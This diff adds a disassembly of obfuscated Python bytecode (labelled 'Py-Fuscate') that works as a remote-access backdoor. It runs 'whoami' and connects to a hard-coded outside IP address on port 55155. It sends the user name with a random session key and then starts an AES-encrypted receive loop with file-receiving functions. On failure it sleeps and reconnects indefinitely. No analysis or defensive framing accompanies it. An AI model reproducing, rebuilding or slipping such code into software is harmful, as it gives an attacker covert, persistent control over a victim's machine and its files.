@@ -1,0 +1,165 @@
+     RESUME                   0
+     LOAD_CONST               0 (0)
+     LOAD_CONST               1 (('popen',))
+     IMPORT_NAME              0 (os)
+     IMPORT_FROM              1 (popen)
+     STORE_NAME               1 (popen)
+     POP_TOP
+     NOP
+     NOP
+L1:     LOAD_CONST               0 (0)
+     LOAD_CONST               2 (None)
+     IMPORT_NAME              2 (socket)
+     STORE_NAME               2 (socket)
+     LOAD_CONST               0 (0)
+     LOAD_CONST               2 (None)
+     IMPORT_NAME              3 (threading)
+     STORE_NAME               3 (threading)
+     LOAD_CONST               0 (0)
+     LOAD_CONST               2 (None)
+     IMPORT_NAME              0 (os)
+     STORE_NAME               0 (os)
+     LOAD_CONST               0 (0)
+     LOAD_CONST               2 (None)
+     IMPORT_NAME              4 (time)
+     STORE_NAME               4 (time)
+     LOAD_CONST               0 (0)
+     LOAD_CONST               2 (None)
+     IMPORT_NAME              5 (random)
+     STORE_NAME               5 (random)
+     LOAD_CONST               0 (0)
+     LOAD_CONST               2 (None)
+     IMPORT_NAME              6 (string)
+     STORE_NAME               6 (string)
+     LOAD_CONST               0 (0)
+     LOAD_CONST               3 (('AES',))
+     IMPORT_NAME              7 (Crypto.Cipher)
+     IMPORT_FROM              8 (AES)
+     STORE_NAME               8 (AES)
+     POP_TOP
+     LOAD_CONST               0 (0)
+     LOAD_CONST               4 (('pad', 'unpad'))
+     IMPORT_NAME              9 (Crypto.Util.Padding)
+     IMPORT_FROM             10 (pad)
+     STORE_NAME              10 (pad)
+     IMPORT_FROM             11 (unpad)
+     STORE_NAME              11 (unpad)
+     POP_TOP
+     LOAD_NAME                0 (os)
+     LOAD_ATTR                2 (popen)
+     PUSH_NULL
+     LOAD_CONST               5 ('whoami')
+     CALL                     1
+     LOAD_ATTR               25 (read + NULL|self)
+     CALL                     0
+     STORE_NAME              13 (user)
+     LOAD_CONST               6 (4096)
+     STORE_NAME              14 (BUFFER_SIZE)
+     LOAD_CONST               7 ('<SEPARATOR>')
+     STORE_NAME              15 (SEPARATOR)
+     LOAD_CONST               8 (True)
+     STORE_NAME              16 (CONN)
+     LOAD_CONST               9 (<code object enc_mes at 0x7306c38a2970, file "Py-Fuscate", line 23>)
+     MAKE_FUNCTION
+     STORE_NAME              17 (enc_mes)
+     LOAD_CONST              10 (<code object dec_file_mes at 0x7306c322ccb0, file "Py-Fuscate", line 33>)
+     MAKE_FUNCTION
+     STORE_NAME              18 (dec_file_mes)
+     LOAD_CONST              11 (<code object dec_mes at 0x7306c38c6c10, file "Py-Fuscate", line 40>)
+     MAKE_FUNCTION
+     STORE_NAME              19 (dec_mes)
+     LOAD_CONST              12 (<code object receive_file at 0x5f9210f45b60, file "Py-Fuscate", line 51>)
+     MAKE_FUNCTION
+     STORE_NAME              20 (receive_file)
+     LOAD_CONST              13 (<code object receive at 0x5f9210f47220, file "Py-Fuscate", line 80>)
+     MAKE_FUNCTION
+     STORE_NAME              21 (receive)
+     LOAD_NAME               22 (__name__)
+     LOAD_CONST              14 ('__main__')
+     COMPARE_OP              88 (bool(==))
+     POP_JUMP_IF_FALSE      179 (to L5)
+     NOP
+L2:     NOP
+L3:     LOAD_NAME                2 (socket)
+     LOAD_ATTR                4 (socket)
+     PUSH_NULL
+     LOAD_NAME                2 (socket)
+     LOAD_ATTR               46 (AF_INET)
+     LOAD_NAME                2 (socket)
+     LOAD_ATTR               48 (SOCK_STREAM)
+     CALL                     2
+     STORE_NAME              25 (client)
+     LOAD_NAME               25 (client)
+     LOAD_ATTR               53 (connect + NULL|self)
+     LOAD_CONST              15 (('13.61.7.218', 55155))
+     CALL                     1
+     POP_TOP
+     LOAD_CONST              16 ('')
+     LOAD_ATTR               55 (join + NULL|self)
+     LOAD_CONST              17 (<code object <genexpr> at 0x7306c38cbe00, file "Py-Fuscate", line 168>)
+     MAKE_FUNCTION
+     LOAD_NAME               28 (range)
+     PUSH_NULL
+     LOAD_CONST              18 (16)
+     CALL                     1
+     GET_ITER
+     CALL                     0
+     CALL                     1
+     STORE_NAME              29 (k)
+     LOAD_NAME               25 (client)
+     LOAD_ATTR               61 (send + NULL|self)
+     LOAD_NAME               13 (user)
+     FORMAT_SIMPLE
+     LOAD_NAME               15 (SEPARATOR)
+     FORMAT_SIMPLE
+     LOAD_NAME               29 (k)
+     FORMAT_SIMPLE
+     BUILD_STRING             3
+     LOAD_ATTR               63 (encode + NULL|self)
+     CALL                     0
+     CALL                     1
+     POP_TOP
+     LOAD_NAME               25 (client)
+     LOAD_ATTR               65 (settimeout + NULL|self)
+     LOAD_CONST              19 (600)
+     CALL                     1
+     POP_TOP
+L4:     NOP
+     LOAD_NAME                3 (threading)
+     LOAD_ATTR               68 (Thread)
+     PUSH_NULL
+     LOAD_NAME               21 (receive)
+     LOAD_NAME               25 (client)
+     LOAD_NAME               29 (k)
+     BUILD_TUPLE              2
+     LOAD_CONST              21 (('target', 'args'))
+     CALL_KW                  2
+     STORE_NAME              35 (receive_thread)
+     LOAD_NAME               35 (receive_thread)
+     LOAD_ATTR               73 (start + NULL|self)
+     CALL                     0
+     POP_TOP
+     RETURN_CONST             2 (None)
+L5:     RETURN_CONST             2 (None)
+L6:     PUSH_EXC_INFO
+     POP_TOP
+L7:     POP_EXCEPT
+     EXTENDED_ARG             1
+     JUMP_BACKWARD_NO_INTERRUPT 282 (to L1)
+L8:     COPY                     3
+     POP_EXCEPT
+     RERAISE                  1
+L9:     PUSH_EXC_INFO
+     POP_TOP
+     LOAD_NAME                4 (time)
+     LOAD_ATTR               66 (sleep)
+     PUSH_NULL
+     LOAD_CONST              20 (50)
+     CALL                     1
+     POP_TOP
+L10:     POP_EXCEPT
+     JUMP_FORWARD             3 (to L12)
+L11:     COPY                     3
+     POP_EXCEPT
+     RERAISE                  1
+L12:     JUMP_BACKWARD          214 (to L2)
